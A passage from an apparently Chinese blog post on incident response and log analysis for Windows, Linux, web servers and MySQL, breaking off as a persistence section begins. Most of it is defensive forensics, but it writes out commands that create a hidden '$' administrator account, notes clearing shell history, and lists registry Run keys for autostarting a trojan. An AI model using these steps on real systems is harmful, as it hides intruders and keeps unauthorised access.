html.strip(b&#x27;\\r\\n&#x27;)</span><br><span class=\"line\">res = html[:-3][::-1]+html[-3:]</span><br><span class=\"line\"># print(base64.b64decode(res))</span><br><span class=\"line\">json.loads(base64.b64decode(res))</span><br></pre></td></tr></table></figure>\n<p>在通过 pyinstaller 无窗口编译成为 exe</p>\n<h4 id=\"账户\"><a class=\"markdownIt-Anchor\" href=\"#账户\">#</a> 账户</h4>\n<blockquote>\n<p>首选管理员账户登录，不建议创建账户</p>\n<p>通过 net use 或者 computer mananger 查看用户</p>\n<p>net user haha$ shabi /add      //$ 结尾的用户为影子用户</p>\n<p>net localgroup adminstrators haha$ /add     // 加到管理员组</p>\n<p>此时 net user 看不到，但 computer manager 能看到</p>\n<p>或者通过注册表注册</p>\n<p>先把影子账户和正常账户导出</p>\n<p>通过修改账户的 F 键为想要克隆的键</p>\n<p>导入注册表</p>\n<p>具体自己查吧…</p>\n<p>控制面板和 net user 看不到，但注册表还是可以看到的</p>\n<p>因此在应急响应时查账户要查三个地方</p>\n<p>注册表，控制面板，net user</p>\n<p>或者使用 D 盾</p>\n<p>或者查看日志 eventvwr.msc</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105174751675.png\" alt=\"image-20221105174751675\" style=\"zoom:80%;\" />\n<p>Windows logs -&gt; security</p>\n<p>4624 4625</p>\n</blockquote>\n<h4 id=\"启动项任务计划服务\"><a class=\"markdownIt-Anchor\" href=\"#启动项任务计划服务\">#</a> 启动项，任务计划，服务</h4>\n<blockquote>\n<p>工具可以排查服务和启动项</p>\n<p>任务计划 task scheduler</p>\n<p>注册表启动项</p>\n<p>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce</p>\n<p>组策略 gpedit.msc 中 自启</p>\n<p>Windows 设置 -&gt; 脚本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108124205969.png\" alt=\"image-20221108124205969\"></p>\n</blockquote>\n<p>总结:<br>\n 用户 -&gt; 端口 -&gt; 进程 -&gt; 注册表 -&gt; 启动项 -&gt; 任务计划 -&gt; 服务 -&gt; 组策略</p>\n<h3 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h3>\n<h4 id=\"账户-2\"><a class=\"markdownIt-Anchor\" href=\"#账户-2\">#</a> 账户</h4>\n<p>1.passwd</p>\n<p>awk -F:  ‘{print $1,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">3,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span></span></span></span>NF}’  | grep -Ev ‘nologin’</p>\n<p>排查 uid 和 gid , 和 bash</p>\n<p>2.shadow</p>\n<p>shadow 中第二列为！代表不能登录</p>\n<p>能正常登录的用户在第二列会有加密的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\">2、查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4、禁用或删除多余及可疑的帐号</span><br><span class=\"line\">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class=\"line\">\tuserdel user       删除 user 用户</span><br><span class=\"line\">\tuserdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure>\n<p>sudoers 中的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## Allow root to run any commands anywhere </span><br><span class=\"line\">root    ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows members of the &#x27;sys&#x27; group to run networking, software, </span><br><span class=\"line\">## service management apps and more.</span><br><span class=\"line\"># %sys ALL = NETWORKING, SOFTWARE, SERVICES, STORAGE, DELEGATING, PROCESSES, LOCATE, DRIVERS</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows people in group wheel to run all commands</span><br><span class=\"line\">%wheel  ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Same thing without a password</span><br><span class=\"line\"># %wheel        ALL=(ALL)       NOPASSWD: ALL</span><br></pre></td></tr></table></figure>\n<p>因此可能存在 sudo 提权</p>\n<h4 id=\"历史命名\"><a class=\"markdownIt-Anchor\" href=\"#历史命名\">#</a> 历史命名</h4>\n<p>可以查看不同用户的历史命令 ～/.bash_history</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、root 用户的历史命令</span><br><span class=\"line\">histroy</span><br><span class=\"line\">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class=\"line\">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class=\"line\">1）保存1万条命令</span><br><span class=\"line\">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class=\"line\">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class=\"line\">######jiagu history xianshi#########</span><br><span class=\"line\">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class=\"line\">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">USER_IP=`hostname`</span><br><span class=\"line\">fi</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class=\"line\">shopt -s histappend</span><br><span class=\"line\">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class=\"line\">######### jiagu history xianshi ##########</span><br><span class=\"line\">3）source /etc/profile 让配置生效</span><br><span class=\"line\">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class=\"line\">3、历史操作命令的清除：history -c</span><br><span class=\"line\">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure>\n<h4 id=\"端口-2\"><a class=\"markdownIt-Anchor\" href=\"#端口-2\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -lntup | more</span><br><span class=\"line\">查看下 pid 所对应的进程文件路径，</span><br><span class=\"line\">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br><span class=\"line\">如果要排查对应的pid的执行文件</span><br><span class=\"line\">在/proc/$pid/exe</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos 6852]# pwd</span><br><span class=\"line\">/proc/6852</span><br><span class=\"line\">[root@VM-16-11-centos 6852]# ls -al</span><br><span class=\"line\">dr-xr-xr-x   9 lighthouse lighthouse 0 Sep 11 14:30 .</span><br><span class=\"line\">dr-xr-xr-x 163 root       root       0 Mar 22  2022 ..</span><br><span class=\"line\">dr-xr-xr-x   2 lighthouse lighthouse 0 Nov  8 17:00 attr</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 cwd -&gt; /www/wwwroot/www.radsm.co/beef_1/beef</span><br><span class=\"line\">-r--------   1 lighthouse lighthouse 0 Nov  8 17:01 environ</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 exe -&gt; /home/lighthouse/.rvm/rubies/ruby-3.0.3/bin/ruby</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"进程-2\"><a class=\"markdownIt-Anchor\" href=\"#进程-2\">#</a> 进程</h4>\n<blockquote>\n<p>ps aux | ps ef</p>\n</blockquote>\n<h4 id=\"启动项\"><a class=\"markdownIt-Anchor\" href=\"#启动项\">#</a> 启动项</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/rc.local</span><br></pre></td></tr></table></figure>\n<h4 id=\"任务计划\"><a class=\"markdownIt-Anchor\" href=\"#任务计划\">#</a> 任务计划</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l   列出某个用户cron服务的详细内容</span><br><span class=\"line\"></span><br><span class=\"line\">重点关注以下目录中是否存在恶意脚本</span><br><span class=\"line\">/var/spool/cron/* </span><br><span class=\"line\">/etc/crontab</span><br><span class=\"line\">/etc/cron.d/*</span><br><span class=\"line\">/etc/cron.daily/* </span><br><span class=\"line\">/etc/cron.hourly/* </span><br><span class=\"line\">/etc/cron.monthly/*</span><br><span class=\"line\">/etc/cron.weekly/</span><br><span class=\"line\">/etc/anacrontab</span><br><span class=\"line\">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>\n<h4 id=\"日志\"><a class=\"markdownIt-Anchor\" href=\"#日志\">#</a> 日志</h4>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class=\"line\">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">定位有哪些IP在爆破：</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class=\"line\"></span><br><span class=\"line\">爆破用户名字典是什么？</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure| awk &#x27;&#123;print $9&#125;&#x27; | sort -nr | uniq -c</span><br><span class=\"line\"> </span><br><span class=\"line\">2、登录成功的IP有哪些： \t</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">登录成功的日期、用户名、IP：</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class=\"line\"></span><br><span class=\"line\">3、增加一个用户kali日志：</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class=\"line\">, shell=/bin/bash</span><br><span class=\"line\">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class=\"line\">#grep &quot;useradd&quot; /var/log/secure </span><br><span class=\"line\"></span><br><span class=\"line\">4、删除用户kali日志：</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\"># grep &quot;userdel&quot; /var/log/secure</span><br><span class=\"line\"></span><br><span class=\"line\">5、su切换用户：</span><br><span class=\"line\">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class=\"line\"></span><br><span class=\"line\">sudo授权执行:</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108174528702.png\" alt=\"image-20221108174528702\"></p>\n<p>账户 历史命令 端口 进程 开机启动 任务计划 日志</p>\n<h3 id=\"webshell-查杀\"><a class=\"markdownIt-Anchor\" href=\"#webshell-查杀\">#</a> webshell 查杀</h3>\n<h4 id=\"工具\"><a class=\"markdownIt-Anchor\" href=\"#工具\">#</a> 工具</h4>\n<p>1.D 盾</p>\n<p>2. 河马</p>\n<p>3. 百度 webdir</p>\n<p>4. 在线 webshell 查杀 bugscanner</p>\n<h4 id=\"发现webshell后门\"><a class=\"markdownIt-Anchor\" href=\"#发现webshell后门\">#</a> 发现 webshell 后门</h4>\n<p>1. 判断 hash</p>\n<p>2.diff</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -c -a -r cms1 cms2</span><br><span class=\"line\">md5sum比较两个文件夹下面文件是否相同</span><br><span class=\"line\"></span><br><span class=\"line\">Copy文件夹之后，检测两个文件夹（dir1，dir2）下文件是否相同。logdir 是任何一个存放生成文件的目录</span><br><span class=\"line\">cd dir1</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\"></span><br><span class=\"line\">cd dir2</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\">cd logdir</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">diff result.txt result.txt</span><br></pre></td></tr></table></figure>\n<p>3. 工具</p>\n<p>winMerge</p>\n<p>beyond compare</p>\n<h2 id=\"日志分析\"><a class=\"markdownIt-Anchor\" href=\"#日志分析\">#</a> 日志分析</h2>\n<h3 id=\"windows日志分析\"><a class=\"markdownIt-Anchor\" href=\"#windows日志分析\">#</a> Windows 日志分析</h3>\n<p>Windows 系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>\n<p>Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>\n<blockquote>\n<p>系统日志</p>\n<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 Windows NT/2000 操作系统预先定义。</p>\n<p>默认位置： % SystemRoot%\\System32\\Winevt\\Logs\\System.evtx</p>\n<p>应用程序日志</p>\n<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx</p>\n<p>安全日志</p>\n<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</p>\n</blockquote>\n<p><strong>开启审核策略</strong></p>\n<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109145256851.png\" alt=\"image-20221109145256851\"></p>\n<p><strong>设置日志属性</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192149696.png\" alt=\"image-20221109192149696\"></p>\n<h4 id=\"日志分析-2\"><a class=\"markdownIt-Anchor\" href=\"#日志分析-2\">#</a> 日志分析</h4>\n<p>对于 Windows 事件日志分析，不同的 EVENT ID 代表了不同的意义，摘录一些常见的安全事件的说明：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109144436445.png\" alt=\"image-20221109144436445\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109153134531.png\" alt=\"image-20221109153134531\"></p>\n<p>4634,4647 远程登录注销时触发</p>\n<h4 id=\"工具分析\"><a class=\"markdownIt-Anchor\" href=\"#工具分析\">#</a> 工具分析：</h4>\n<p><strong>Log Parser</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">登录成功的所有事件</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">指定登录时间范围的事件：</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提取登录成功的用户名和IP：</span><br><span class=\"line\">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>LogParser Lizard</strong></p>\n<p><strong>Event Log Explorer</strong></p>\n<h3 id=\"linux-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#linux-日志分析\">#</a> linux 日志分析</h3>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192416867.png\" alt=\"image-20221109192416867\"></p>\n<p>比较重要的几个日志：<br>\n登录失败记录：/var/log/btmp     //lastb</p>\n<p>​\t最后一次登录：/var/log/lastlog  //lastlog</p>\n<p>​\t登录成功记录: /var/log/wtmp     //last</p>\n<p>​\t登录日志记录：/var/log/secure</p>\n<p>​\t目前登录用户信息：/var/run/utmp  //w、who、users</p>\n<p>​\t历史命令记录：history</p>\n<p>​\t仅清理当前用户： history -c</p>\n<p>日志分析 find grep egrep awk sed</p>\n<h3 id=\"web-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#web-日志分析\">#</a> web 日志分析</h3>\n<p>Apache 日志分析技巧：</p>\n<p>Web 访问日志记录了 Web 服务器接收处理请求及运行时错误等各种原始信息。通过对 WEB 日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、列出当天访问次数最多的IP命令：</span><br><span class=\"line\">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class=\"line\"></span><br><span class=\"line\">2、查看当天有多少个IP访问：</span><br><span class=\"line\">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">3、查看某一个页面被访问的次数：</span><br><span class=\"line\">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">4、查看每一个IP访问了多少个页面：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class=\"line\"></span><br><span class=\"line\">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class=\"line\"></span><br><span class=\"line\">6、查看某一个IP访问了哪些页面：</span><br><span class=\"line\">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">7、去掉搜索引擎统计当天的页面：</span><br><span class=\"line\">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class=\"line\">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l\t</span><br></pre></td></tr></table></figure>\n<p>日志分析过程</p>\n<p>1、定位攻击源</p>\n<p>2、搜索相关日志记录</p>\n<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>\n<p>4. 加固攻击者访问的网站</p>\n<h3 id=\"mysql日志分析\"><a class=\"markdownIt-Anchor\" href=\"#mysql日志分析\">#</a> mysql 日志分析</h3>\n<p>设置日志</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查看log配置信息</span><br><span class=\"line\">show variables like &#x27;%general%&#x27;;</span><br><span class=\"line\">2、开启日志</span><br><span class=\"line\">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class=\"line\">3、指定日志文件路径</span><br><span class=\"line\">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure>\n<p>主要需要注意爆破 root 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#有哪些IP在爆破</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class=\"line\">     27 192.168.204.1</span><br><span class=\"line\"></span><br><span class=\"line\">#爆破用户名字典都有哪些</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort -nr</span><br><span class=\"line\">     13 mysql</span><br><span class=\"line\">     12 root</span><br><span class=\"line\">      1 root</span><br><span class=\"line\">      1 mysql</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>如果爆破密码，失败的时候会显示 &quot;Access denied&quot;，可靠此进行分析</p>\n<h2 id=\"权限维持\"><a class=\"markdownIt-Anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<h3 id=\"windows-2\"><a class=\"markdownIt-Anchor\" href=\"#windows-2\">#</a> Windows</h3>\n<h4 id=\"0x01-注册表自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x01-注册表自启动\">#</a> 0x01 注册表自启动</h4>\n<p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Run键 </span><br><span class=\"line\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\"></span><br><span class=\"line\"># Winlogon\\Userinit键</span><br><span 